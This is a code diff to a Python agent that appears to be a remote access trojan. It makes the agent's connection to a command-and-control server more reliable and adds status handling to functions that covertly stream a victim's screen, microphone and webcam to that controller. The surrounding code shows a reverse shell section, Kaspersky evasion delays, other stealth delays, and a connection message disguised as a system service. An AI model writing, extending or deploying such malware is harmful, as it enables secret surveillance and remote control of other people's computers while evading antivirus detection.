@@ -201,7 +201,7 @@ except ImportError:
     SOCKETIO_AVAILABLE = False
     print("Warning: python-socketio not available, real-time communication may not work")
 
-SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
+SERVER_URL = "http://localhost:8080"  # Local controller URL for development
 
 # --- Agent State ---
 STREAMING_ENABLED = False
@@ -237,7 +237,12 @@ if SOCKETIO_AVAILABLE:
     sio = socketio.Client(
         ssl_verify=False,  # Disable SSL verification to prevent warnings
         engineio_logger=False,
-        logger=False
+        logger=False,
+        reconnection=True,
+        reconnection_attempts=5,
+        reconnection_delay=1,
+        reconnection_delay_max=5,
+        timeout=10
     )
 else:
     sio = None
@@ -2720,12 +2725,28 @@ def stream_audio(agent_id):
 
 def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
+    
+    # Validate Socket.IO connection
+    if not SOCKETIO_AVAILABLE or not sio or not sio.connected:
+        return "Error: Socket.IO not connected. Cannot start streaming."
+    
+    # Validate required dependencies
+    if not MSS_AVAILABLE:
+        return "Error: mss library not available. Install with: pip install mss"
+    if not CV2_AVAILABLE:
+        return "Error: opencv-python not available. Install with: pip install opencv-python"
+    if not NUMPY_AVAILABLE:
+        return "Error: numpy not available. Install with: pip install numpy"
+    
     if not STREAMING_ENABLED:
         STREAMING_ENABLED = True
         STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
         print("Started video stream.")
+        return "Screen streaming started successfully"
+    else:
+        return "Screen streaming is already active"
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD
@@ -2735,15 +2756,30 @@ def stop_streaming():
             STREAM_THREAD.join(timeout=2)
         STREAM_THREAD = None
         print("Stopped video stream.")
+        return "Screen streaming stopped successfully"
+    else:
+        return "Screen streaming was not active"
 
 def start_audio_streaming(agent_id):
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
+    
+    # Validate Socket.IO connection
+    if not SOCKETIO_AVAILABLE or not sio or not sio.connected:
+        return "Error: Socket.IO not connected. Cannot start audio streaming."
+    
+    # Validate required dependencies
+    if not PYAUDIO_AVAILABLE:
+        return "Error: PyAudio not available. Install with: pip install pyaudio"
+    
     if not AUDIO_STREAMING_ENABLED:
         AUDIO_STREAMING_ENABLED = True
         AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
         AUDIO_STREAM_THREAD.daemon = True
         AUDIO_STREAM_THREAD.start()
         print("Started audio stream.")
+        return "Audio streaming started successfully"
+    else:
+        return "Audio streaming is already active"
 
 def stop_audio_streaming():
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
@@ -2753,15 +2789,30 @@ def stop_audio_streaming():
             AUDIO_STREAM_THREAD.join(timeout=2)
         AUDIO_STREAM_THREAD = None
         print("Stopped audio stream.")
+        return "Audio streaming stopped successfully"
+    else:
+        return "Audio streaming was not active"
 
 def start_camera_streaming(agent_id):
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
+    
+    # Validate Socket.IO connection
+    if not SOCKETIO_AVAILABLE or not sio or not sio.connected:
+        return "Error: Socket.IO not connected. Cannot start camera streaming."
+    
+    # Validate required dependencies
+    if not CV2_AVAILABLE:
+        return "Error: opencv-python not available. Install with: pip install opencv-python"
+    
     if not CAMERA_STREAMING_ENABLED:
         CAMERA_STREAMING_ENABLED = True
         CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
         CAMERA_STREAM_THREAD.daemon = True
         CAMERA_STREAM_THREAD.start()
         print("Started camera stream.")
+        return "Camera streaming started successfully"
+    else:
+        return "Camera streaming is already active"
 
 def stop_camera_streaming():
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
@@ -2771,6 +2822,9 @@ def stop_camera_streaming():
             CAMERA_STREAM_THREAD.join(timeout=2)
         CAMERA_STREAM_THREAD = None
         print("Stopped camera stream.")
+        return "Camera streaming stopped successfully"
+    else:
+        return "Camera streaming was not active"
 
 # --- Reverse Shell Functions ---
 
@@ -6179,28 +6233,39 @@ def main_unified():
 @sio.event
 def connect():
     """Handle connection to server."""
-    agent_id = get_or_create_agent_id()
-    
-    # Add multiple stealth delays
-    if ADVANCED_STEALTH_AVAILABLE:
-        stealth_delay_v2()
-    if KASPERSKY_EVASION_AVAILABLE:
-        kaspersky_evasion_delay()
-    if STEALTH_AVAILABLE:
-        stealth_delay()
-    
-    # Obfuscated connection message
-    if ADVANCED_STEALTH_AVAILABLE or KASPERSKY_EVASION_AVAILABLE:
-        print(f"System service connected. Session: {agent_id[:8]}...")
-    else:
-        print(f"Connected to server. Registering with agent_id: {agent_id}")
-    
-    sio.emit('agent_connect', {'agent_id': agent_id})
+    try:
+        agent_id = get_or_create_agent_id()
+        
+        # Add multiple stealth delays
+        if ADVANCED_STEALTH_AVAILABLE:
+            stealth_delay_v2()
+        if KASPERSKY_EVASION_AVAILABLE:
+            kaspersky_evasion_delay()
+        if STEALTH_AVAILABLE:
+            stealth_delay()
+        
+        # Obfuscated connection message
+        if ADVANCED_STEALTH_AVAILABLE or KASPERSKY_EVASION_AVAILABLE:
+            print(f"System service connected. Session: {agent_id[:8]}...")
+        else:
+            print(f"Connected to server. Registering with agent_id: {agent_id}")
+        
+        # Register with the controller
+        sio.emit('agent_connect', {'agent_id': agent_id})
+        print(f"[OK] Agent registration sent for ID: {agent_id[:8]}...")
+        
+    except Exception as e:
+        print(f"[ERROR] Agent connection failed: {e}")
 
 @sio.event
 def disconnect():
     """Handle disconnection from server."""
     print("Disconnected from server")
+    # Stop all streaming when disconnected
+    global STREAMING_ENABLED, AUDIO_STREAMING_ENABLED, CAMERA_STREAMING_ENABLED
+    STREAMING_ENABLED = False
+    AUDIO_STREAMING_ENABLED = False
+    CAMERA_STREAMING_ENABLED = False
 
 @sio.on('command')
 def on_command(data):
